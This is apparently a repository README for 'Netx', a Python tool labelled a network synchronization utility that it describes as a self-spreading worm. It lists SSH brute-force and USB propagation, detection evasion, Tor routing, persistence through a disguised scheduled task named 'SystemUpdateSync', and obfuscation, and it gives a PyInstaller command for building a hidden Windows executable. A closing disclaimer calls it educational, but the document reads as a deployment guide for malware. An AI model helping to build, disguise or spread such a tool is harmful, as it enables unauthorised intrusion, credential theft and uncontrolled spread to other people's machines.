### 🛡️ Project Netx: Adaptive Network Synchronization Utility

Netx is a high-performance, low-footprint Python utility designed for automated network discovery, synchronization, and persistent lateral movement. It utilizes a multi-layered approach to bypass standard security restrictions while maintaining a near-zero CPU profile.

### 🚀 Key Features

Mutual Exclusion (Mutex): Prevents process collision by ensuring only one instance operates per machine.

Adaptive Priority: Automatically throttles itself to IDLE_PRIORITY_CLASS on Windows to evade behavioral detection.

Tor Expert Bundle Integration: Automated download and silent execution of Tor for circuit-rotated SSH operations.

Persistence Bypass: Evades Startup folder permissions by utilizing the Windows Task Scheduler (schtasks).

Multi-Vector Spreading: Simultaneous lateral movement via SSH bruteforce and physical USB propagation.


### 🛠️ Technical Architecture

Component	Technology	Logic
Networking	nmap / paramiko	Scans Gateway /24 for Port 22 and attempts credential injection.
Anonymity	Stem / PySocks	Routes non-local traffic through Tor SOCKS5 proxy with circuit rotation.
Synchronization	msvcrt	Uses kernel-level file locking in %TEMP% for the Mutex.
Persistence	schtasks	Creates a task named SystemUpdateSync to trigger on user logon.

### 📦 Compilation & Deployment

To ensure maximum compatibility and stealth, the script must be obfuscated and bundled into a standalone binary.

1. Obfuscation (Via PyArmor)

To protect the source code from static analysis and string-based detection (Already built)

2. Bundling (Via PyInstaller)

Run this on a Windows environment to generate the final .exe:

PowerShell
cd netx
pyinstaller --onefile --noconsole --add-data "wordlist.txt;." dist/main.py
Note: The --noconsole flag ensures the process runs purely in the background without a terminal window.

### 📂 Project Structure

main.py: The core logic engine.

wordlist.txt: Local dictionary for initial credential attempts (bundled into EXE).

dist/: Output directory for the obfuscated runtime.

%TEMP%/tor_bundle/: Automated staging area for the Tor Expert Bundle.


#### ⚠️ Requirements
Platform: Windows 10/11 (Target)

Compiler: Python 3.10+

Dependencies: paramiko, python-nmap, psutil, netifaces, stem, pysocks.

### 🛑 Disclaimer
This software is developed for educational and authorized security auditing purposes only. The author is not responsible and does not contribute to whatever you do with it.
